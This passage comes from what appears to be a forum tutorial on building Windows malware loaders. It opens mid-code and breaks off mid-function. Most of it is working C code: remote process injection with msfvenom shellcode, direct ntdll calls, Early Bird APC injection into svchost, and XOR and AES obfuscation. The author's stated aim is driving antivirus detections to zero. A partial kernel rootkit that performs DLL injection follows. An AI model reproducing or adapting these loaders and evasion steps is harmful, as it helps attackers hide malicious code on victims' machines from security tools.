rThread = bCreateRemoteThread(hTargetProcHandle, lpStartExecAddr, lpExecParam);
WaitForSingleObject(rThread, INFINITE);
```

# Shellcode Execution Techniques
Now, let&#39;s dive into the world of &#39;injections.&#39;, we&#39;ll begin with some benign code that leverages Win32 APIs. We&#39;ll examine how it functions at a fundamental level and then transition toward more evil code, aiming to bypass these APIs and arrive at a more malicious outcome, Sounds Good So Check This out: 

```c
int main(void){

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    if(!CreateProcessW(
        L&quot;C:\\Windows\\System32\\notepad.exe&quot;,
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
)){
        printf(&quot;(-) failed to create process, error: %ld&quot;, GetLastError());
        return EXIT_FAILURE;
    }

    printf(&quot;(+) process started! PID:%ld&quot;, pi.dwProcessId);
    return EXIT_SUCCESS;
}
```

What&#39;s the purpose of this code, you may wonder? You likely have an inkling already, don&#39;t you? Well, we&#39;re initiating a fresh Notepad process. Let me assure you, there&#39;s nothing shady about this code it&#39;s entirely above board and legitimate. We&#39;re utilizing the &#39;CreateProcessW&#39; function, which is all about orchestrating the precise way a new process should be launched. You provide it with a set of parameters, and voilà, a new process comes to life. 

```
BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

Now, let&#39;s take a deeper look into our coding journey. We&#39;re not inventing something entirely new; instead, we&#39;re refining existing code droppers and loaders for Windows targets, making them responsive to our  session commands.

Our goal here is to run unrestricted shellcode. Our toolkit includes familiar Windows API functions: &#39;OpenProcess,&#39; &#39;VirtualAllocEx,&#39; &#39;WriteProcessMemory,&#39; and &#39;CreateRemoteThread.&#39; Think of it as conducting an orchestra, where each function plays a specific role in enabling the shellcode to do its job. We&#39;re in charge, and the Windows targets should be ready to follow our instructions.
##  Injection

```c
int main()
{
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    
(!CreateProcessW(
        L&quot;C:\\Windows\\System32\\notepad.exe&quot;,
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
));
  
  char shellcode[] ={
  };

    HANDLE hProcess; 
    HANDLE hThread;
    void*exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pi.dwProcessId);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL,0,0);
    CloseHandle(hProcess);
    return 0;
}
```

Alright, do you notice any differences? Bingo, there&#39;s &quot;shellcode.&quot; Let me clarify; the initial code segment was straightforward, mainly focusing on creating a new process (Notepad) and adjusting its priority class. However, the code we&#39;re dealing with now is more sinister, as it centers around remote process injection and the implementation of functions such as `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` to allocate memory within a target process and execute custom shellcode within it.

Nevertheless, plaintext Metasploit (msf) shellcode tends to raise red flags and is susceptible to detection by antivirus engines. In the preceding section, we delved into shellcode development, particularly emphasizing a reverse shell. Yet, this code is simpler and can be swiftly pinpointed by antivirus engines. So, let&#39;s explore an alternative strategy how about encoding the shellcode into Read-Write-Execute (RWX) memory to initiate Notepad?

Alright, RWX memory implementation is fairly straightforward for our intended purpose. It involves searching a process&#39;s private virtual memory space (the userland virtual memory space) for a memory section marked as _PAGE_EXECUTE_READWRITE_. If such a space is found, it&#39;s returned. If not, the next search address is adjusted to the subsequent memory region (_BaseAddress_ + _Memory Region_).

To finalize this for code execution, our shellcode must then be relocated to that discovered memory region and executed. An efficient way to achieve this is to resort  WinAPI calls, similar to what we demonstrated in the first technique. However, it&#39;s essential to consider the drawbacks of that approach, as discussed above.

```c
int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;
&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;
&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;
&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;
&quot;\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00&quot;;
        
    int newPid = atoi(argv[1]);  
    printf(&quot;Injecting into pid %d\n&quot;, newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf(&quot;Invalid Handle\n&quot;);  
        exit(1);  
    }  
    LPVOID remoteBuf = VirtualAllocEx(pHandle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (!remoteBuf)  
    {  
        printf(&quot;Alloc Fail\n&quot;);  
        exit(1);  
    }  
    printf(&quot;alloc addr: %p\n&quot;, remoteBuf);  
    WriteProcessMemory(pHandle, remoteBuf, shellcode, sizeof(shellcode), NULL);  
    CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);  
    return 0;  
}
```

Let&#39;s  try to move away from them and directly use the undocumented functions within `ntdll.dll` in this one we go level lower where we do the syscalls directly.

We need:

- NtAllocateVirtualMemory
- NtWriteVirtualMemory
- NtCreateThreadEx

Since these APIs are not documented by Microsoft, we need to find some external references made by reverse engineers. http://undocumented.ntinternals.net/

Let’s look at the definition of an `NTAPI` function from the reference link:

```
NTSYSAPI   
NTSTATUS  
NTAPI  
  
NtAllocateVirtualMemory(  
  
  
  IN HANDLE               ProcessHandle,  
  IN OUT PVOID            *BaseAddress,  
  IN ULONG                ZeroBits,  
  IN OUT PULONG           RegionSize,  
  IN ULONG                AllocationType,  
  IN ULONG                Protect );
```

`NTSTATUS` is the actual return value, while `NTSYSAPI` marks the function as a library import and `NTAPI` defines the windows api calling convention.

`IN` means the function requires it as input, while `OUT` means that the parameter passed in is modified with some return output.

When we prototype the functions, we just need to note the `NTAPI` part.  
In fact you can also use `WINAPI` since the both of them resolve to `__stdcall`.

```c
typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
```

Here we prototype some function pointers that we’ll map the address of the actual functions in `ntdll.dll` to later.

You might notice that some types are also missing, for example the `POBJECT_ATTRIBUTES`, so let’s find and define them from the references.

```c
typedef struct _UNICODE_STRING {  
    USHORT Length;  
    USHORT MaximumLength;  
    PWSTR  Buffer;  
} UNICODE_STRING, *PUNICODE_STRING;  
  
typedef struct _OBJECT_ATTRIBUTES {  
    ULONG           Length;  
    HANDLE          RootDirectory;  
    PUNICODE_STRING ObjectName;  
    ULONG           Attributes;  
    PVOID           SecurityDescriptor;  
    PVOID           SecurityQualityOfService;  
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;  
  
typedef struct _PS_ATTRIBUTE {  
    ULONG Attribute;  
    SIZE_T Size;  
    union {  
        ULONG Value;  
        PVOID ValuePtr;  
    } u1;  
    PSIZE_T ReturnLength;  
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;  
  
typedef struct _PS_ATTRIBUTE_LIST  
{  
    SIZE_T       TotalLength;  
    PS_ATTRIBUTE Attributes[1];  
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
```

Now Let&#39;s load `ntdll.dll` and map the functions.

```c
HINSTANCE hNtdll = LoadLibraryW(L&quot;ntdll.dll&quot;);  
if (!hNtdll)  
{  
    printf(&quot;Load ntdll fail\n&quot;);  
    exit(1);  
}  
  
NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);  
NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);  
NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);
```

Finally we can call these functions. 

```c  
typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);  
  
int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;
&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;
&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;
&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;
&quot;\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00&quot;;
     
	int newPid = atoi(argv[1]);  
	printf(&quot;Injecting into pid %d\n&quot;, newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf(&quot;Invalid Handle\n&quot;);  
        exit(1);  
    }  
    HANDLE tHandle;  
    HINSTANCE hNtdll = LoadLibraryW(L&quot;ntdll.dll&quot;);  
    if (!hNtdll)  
    {  
        printf(&quot;Load ntdll fail\n&quot;);  
        exit(1);  
    }  
  
    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);  
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);  
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);  
    void * allocAddr = NULL;  
    SIZE_T allocSize = sizeof(shellcode);  
    NTSTATUS status;  
    status = NtAllocateVirtualMemory(pHandle, &amp;allocAddr, 0, (PULONG)&amp;allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    printf(&quot;status alloc: %X\n&quot;, status);  
    printf(&quot;alloc addr: %p\n&quot;, allocAddr);  
    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sizeof(shellcode), NULL);  
    printf(&quot;status write: %X\n&quot;, status);  
    status = NtCreateThreadEx(&amp;tHandle, GENERIC_EXECUTE, NULL, pHandle, allocAddr, NULL, 0, 0, 0, 0, NULL);  
    printf(&quot;status exec: %X\n&quot;, status);  
  
	return 0;  
}
```

So, if you decide to upload this to antivirus engines (which I don&#39;t recommend, but the choice is yours), what can you expect? Well, you might see 27 out of 72 detections triggering alarms left and right, screaming &#39;MALICIOUS!&#39; It&#39;s as if the antivirus engines are having a celebration. But here&#39;s the real challenge: we&#39;re striving for a complete absence of detections. We&#39;re not looking for a party, we&#39;re after more stealthy.

![AAA|690x189](upload://wGhxEciBeqiwVyYKqZTzj2xU4lO.png)

Like I said msf shellcode is a give away but let&#39;s Try something else.  Time to dust off some classic techniques that never go out of style. We&#39;re diving into XOR encryption, a method you&#39;re probably familiar with when it comes to encrypting shellcode. When XOR encryption is put to work on shellcode, a key is carefully selected to XOR every byte of the shellcode. To decrypt the shellcode, you simply employ the same key to XOR each byte once more, effectively reversing the encryption process and restoring the original shellcode. However, it&#39;s worth noting that XOR encryption can be a walk in the park for attackers who know the key. If you&#39;re up for a challenge, check out the one I posted a while back [ReverseMeCipher](https://0x00sec.org/t/reverseme-cipher/35518) which involves XOR encryption. Here&#39;s a writeup to give you some insights [CipherWriteup](https://0xf00i.github.io/2023/06/12/ReverseMe-Writeup.html) As a general rule, it&#39;s often smarter to combine XOR encryption with other methods. 

So first we wanna remove strings and debug symbols,  Running the command `strings` on our exe reveals strings such as “NtCreateThreadEx”, which may lead to AV detection.

We can remove these strings by again XOR encrypting them and decrypting during runtime, First we start by the function responsible for encryption and decryption 

```c
unsigned char * rox(unsigned char *, int, int);
unsigned char * rox(unsigned char * data, int dataLen, int xor_key)
{
    unsigned char * output = (unsigned char *)malloc(sizeof(unsigned char) * dataLen + 1);

    for (int i = 0; i &lt; dataLen; i++)
        output[i] = data[i] ^ xor_key;

    return output;
}
```

This Function can be used for encryption and also be used for decryption by applying the same XOR operation. If you XOR the encrypted data with the same `xor_key`, it will revert to the original data, just formats encrypted shellcode nicely so we can copy and paste, and we only need the encrypt function in our actual injector.

```c
const char* ntdll_str = (const char*)ntdll;
const char* navm_str = (const char*)navm;
const char* nwvm_str = (const char*)nwvm;
const char* ncte_str = (const char*)ncte;
```

So like we said NtCreateThreadEx.&quot; These strings can be indicative of the program&#39;s functionality and may lead to antivirus (AV), One way to obfuscate these strings and make them less detectable is to XOR encrypt them, and then decrypt them during runtime when they are needed.

For example:

```c
unsigned char ntdll_data[] = {0x3d, 0x27, 0x37, 0x3f, 0x3f, 0x7d, 0x37, 0x3f, 0x3f, 0x53};
unsigned char *ntdll = rox(ntdll_data, 10, 0x53);
```

Let’s use [Virustotal](https://www.virustotal.com/) again and check the detection rate.

![BBB|690x179](upload://txuKpdmUR8SvwXRgZT5T5uYfxj3.png)


Well, going from 27 detections down to 9 is indeed a notable improvement, but it&#39;s essential to recognize that this level of evasion is still relatively basic, especially when relying on tools like `msfvenom` to achieve our goals.

Alright time for a new code Injection Technique &quot;Early Bird&quot; This Was used by group goes by APT33 How this works Simply it takes advantage of the application threading process that happens when a program executes on a computer. In other words, attackers inject malware code into legitimate process threads in an effort to hide malicious code inside commonly seen and legitimate processes.

We gone use functions like `VirtualAllocEx`, `WriteProcessMemory`, `QueueUserAPC`, `CreateProcessW`, and `ResumeThread` By this time Before injecting the shellcode we  a employs an AES decryption routine, The decryption process uses the Cryptography API (CryptAcquireContextW) functions to decrypt the payload using a predefined key.

```c
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {

HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;

BOOL CryptAcquire = CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
if (CryptAcquire == false) {
//printf(&quot;CryptAcquireContextW Failed: %d\n&quot;, GetLastError());
return -1;
}

BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash);
if (CryptCreate == false) {
//printf(&quot;CryptCreateHash Failed: %d\n&quot;, GetLastError());
return -1;
}

  
BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
if (CryptHash == false) {
//printf(&quot;CryptHashData Failed: %d\n&quot;, GetLastError());
return -1;
}

  

BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &amp;hKey);
if (CryptDerive == false) {
//printf(&quot;CryptDeriveKey Failed: %d\n&quot;, GetLastError());
return -1;
}

  

BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &amp;payload_len);
if (Crypt_Decrypt == false) {
//printf(&quot;CryptDecrypt Failed: %d\n&quot;, GetLastError());
return -1;
}

  

CryptReleaseContext(hProv, 0);
CryptDestroyHash(hHash);
CryptDestroyKey(hKey);

return 0;
}
```

The AES decryption routine ensures that the injected shellcode is in its original, unencrypted form, which is essential for executing it within the target process. This decryption process allows attackers to conceal the true nature of their payload until it is actively executed in the target process&#39;s thread. 

Next `CreateProcessW` 

```c
pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L&quot;KERNEL32.DLL&quot;), &quot;CreateProcessW&quot;);
if (pCreateProcessW == NULL) {
    // Handle error if the function cannot be found
}

STARTUPINFOW si;
PROCESS_INFORMATION pi;

// Clear out startup and process info structures
RtlSecureZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si;
RtlSecureZeroMemory(&amp;pi, sizeof(pi));

std::wstring pName = L&quot;C:\\Windows\\System32\\svchost.exe&quot;;

HANDLE pHandle = NULL;
HANDLE hThread = NULL;
DWORD Pid = 0;

BOOL cProcess = pCreateProcessW(NULL, &amp;pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);

```

The `CreateProcessW` function is invoked to create a new process, which, in this case, is intended to execute the `svchost.exe` application. However, a critical parameter here is `CREATE_SUSPENDED`, which is set to `TRUE`, After successfully creating the suspended process, the code retrieves the process and thread handles. These handles are crucial for further manipulation of the newly created process.

```
pHandle = pi.hProcess;
hThread = pi.hThread;
Pid = pi.dwProcessId;
```

With the suspended process and its associated handles in place, now we ready to proceed with the code injection, which involves injecting shellcode into the memory space of the newly created process.

Creating a suspended process provides an ideal opportunity to inject code and manipulate the process without raising immediate suspicion.

In the next steps, we will proceed to inject the shellcode into the suspended process, ultimately leading to its execution within the context of the target process&#39;s thread, However Before injecting the shellcode, memory space is allocated within the target process to accommodate the injected code. This allocation is done using the `VirtualAllocEx` function.

```c
LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
```

The shellcode, which was previously decrypted, is now written into the allocated memory space within the target process using the `WriteProcessMemory` function.

```cpp
DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &amp;bytesWritten);
```

With the shellcode successfully injected into the target process&#39;s memory, the code prepares for its execution. This is done using the `QueueUserAPC` function, which enqueues the shellcode for execution within the context of a specific thread within the target process.


```c
if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
    pResumeThread(hThread);
}
```

Now, let&#39;s verify the success of our concealment strategy by injecting the shellcode into a suspended process and manipulating the memory space within the context of the process&#39;s thread.

![CCC|690x169](upload://fCUP6PNVSZF5U2KAGq0ym7rxtmV.png)

Among the initial 72 detections, we&#39;ve successfully narrowed it down to a mere 5. We commenced with 27 detections, which subsequently decreased to 9, and now we find ourselves with just 5 remaining, and we can keep it going and I&#39;m pretty sure we hit that big zero, This overarching perspective emphasizes the importance of having a diverse array of techniques in your arsenal.

# Writing a simple Rootkit
Kernel mode rootkits operate at the most privileged level, known as &quot;Ring 0,&quot; in the computer&#39;s architecture. In contrast, user mode rootkits run at &quot;Ring 3,&quot; which is a lower privilege level.

In order to grasp the workings of kernel mode rootkits, it is essential to have a solid grasp of the basics of Windows device drivers. Essentially, a device driver is a software component responsible for interfacing with hardware and managing Input/Output Request Packets (IRPs).
### Writing a Windows Device Driver

Let&#39;s start by building a basic Windows device driver:

```c
#include &quot;ntddk.h&quot;

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    DbgPrint(&quot;Hello World!&quot;);
    return STATUS_SUCCESS;
}

```

This simple driver initializes and prints &quot;Hello World!&quot; to the kernel debugger. However, to perform more complex tasks, we need to understand IRPs.

## Understanding I/O Request Packets (IRPs)
IRPs are data structures used to communicate between user-mode programs and kernel-mode drivers. When a user-mode program, for example, writes data to a file handle, the kernel creates an IRP to manage this operation.

To process IRPs effectively, a driver must define functions for handling them. In the provided code, we set up a basic dispatch function that completes the IRP with a success status. In reality, different functions would handle various IRP types.

```c
NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
```

The driver sets up major function pointers, such as `IRP_MJ_CREATE`, `IRP_MJ_CLOSE`, `IRP_MJ_READ`, `IRP_MJ_WRITE`, and `IRP_MJ_DEVICE_CONTROL`, to handle specific IRP types. In a comprehensive driver, separate functions would handle these major functions.

## Creating a File Handle
File handles are essential for user-mode programs to interact with kernel drivers. In Windows, to use a kernel driver from user-mode, the user-mode program must open a file handle to the driver. The driver first registers a named device, and then the user-mode program opens it as if it were a file.

```c
const WCHAR deviceNameBuffer[] = L&quot;\\Device\\MyDevice&quot;;
PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceNameUnicodeString;

    RtlInitUnicodeString(&amp;deviceNameUnicodeString, deviceNameBuffer);

    ntStatus = IoCreateDevice(DriverObject, 0, &amp;deviceNameUnicodeString, 0x00001234, 0, TRUE, &amp;g_RootkitDevice);
    // ...
}

```

This code registers a device named &quot;MyDevice.&quot; A user-mode program can open this device using a fully qualified path, e.g., `\\\\Device\\MyDevice`. This file handle can be used with functions like `ReadFile` and `WriteFile`, which generate IRPs for communication.

Understanding the interaction between user-mode and kernel-mode via IRPs and file handles is fundamental to writing effective Windows device drivers, an essential concept in the realm of kernel mode rootkits.

Remember **DLL Injection**? Now, let&#39;s take a look at how it&#39;s employed by rootkits to inject malicious code or custom device drivers directly into the Windows kernel. In the context of the previously discussed device driver and rootkit concepts, we can explore how kernel-mode DLL injection fits into the picture:
### Kernel-Mode DLL
The process typically begins with the `DriverEntry` function, which is the entry point for our driver. Here&#39;s how we start:

```c
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverobject, IN PUNICODE_STRING pRegister)
{

NTSTATUS st;
  
PsSetLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);

pDriverobject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;
  
return STATUS_SUCCESS;
}
```

In this code snippet, we employ the `PsSetLoadImageNotifyRoutine` function to register an image load notification routine. This step is crucial as it allows us to monitor the loading of specific system DLLs, such as `kernel32.dll`, into the kernel&#39;s address space.

Additionally, we set the driver&#39;s unload function (`pDriverobject-&gt;DriverUnload`) to handle cleanup operations when the driver is unloaded. This ensures that any resources or callbacks registered during the driver&#39;s lifetime are properly managed.

### Image Load Notification
Our monitoring process hinges on image load notifications. We need to identify when the system loads `kernel32.dll`, a fundamental DLL for Windows operating systems. The `LoadImageNotifyRoutine` function enables this monitoring.

```c
VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
{
    if (ImageName != NULL)
    {
        // Check if the loaded image matches the name of kernel32.dll
        WCHAR kernel32Mask[] = L&quot;*\\KERNEL32.DLL&quot;;
        UNICODE_STRING kernel32us;
        RtlInitUnicodeString(&amp;kernel32us, kernel32Mask);

        if (FsRtlIsNameInExpression(&amp;kernel32us, ImageName, TRUE, NULL))
        {
            PKAPC Apc;
            
            if (Hash.Kernel32dll == 0)
            {
                // Initialize the Hash structure and import the function addresses
                Hash.Kernel32dll = (PVOID)pImageInfo-&gt;ImageBase;
                Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, SIRIFEF_LOADLIBRARYEXA_ADDRESS);
            }

            // Create an Asynchronous Procedure Call (APC) to initiate DLL injection
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                KeInitializeApc(Apc, KeGetCurrentThread(), 0, (PKKERNEL_ROUTINE)APCInjectorRoutine, 0, 0, KernelMode, 0);
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
            }
        }
    }
    return;
}

```

The `LoadImageNotifyRoutine` function plays a pivotal role in our DLL injection process. It checks if the `ImageName` parameter is not NULL, ensuring that we are actively monitoring loaded images with names. Furthermore, we examine if the loaded image matches the name of `kernel32.dll`.

If a match is found, we proceed with initializing the `Hash` structure and creating an Asynchronous Procedure Call (APC) using the `APCInjectorRoutine`. The APC serves as a mechanism to trigger the DLL injection process into a target process.

These code snippets are instrumental in monitoring and responding to the loading of `kernel32.dll` and lay the groundwork for our upcoming discussion on kernel-mode DLL injection.
### Unloading the Driver
Before we dive deeper into DLL injection, it&#39;s essential to understand how the driver can be unloaded properly. We accomplish this using the `Unload` function.

```c
VOID Unload(IN PDRIVER_OBJECT pDriverobject)
{
    // Remove the image load notification routine
    PsRemoveLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);
}
```

Here, we use the `PsRemoveLoadImageNotifyRoutine` function to unregister the previously registered image load notification routine. This step ensures that we can gracefully clean up and stop monitoring loaded images when the driver is unloaded.

###  DLL Injection 
Our exploration of kernel-mode DLL injection is incomplete without understanding how the actual injection takes place. The `DllInject` function is the key to achieving this.

```c
NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
{
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cidprocess = { 0 };
    CHAR DllFormatPath[] = &quot;C:\\foo.dll&quot;;
    ULONG Size = strlen(DllFormatPath) + 1;
    PVOID pvMemory = NULL;

    cidprocess.UniqueProcess = ProcessId;
    cidprocess.UniqueThread = 0;

    // Open the target process
    if (NT_SUCCESS(ZwOpenProcess(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;oa, &amp;cidprocess)))
    {
        // Allocate virtual memory in the target process
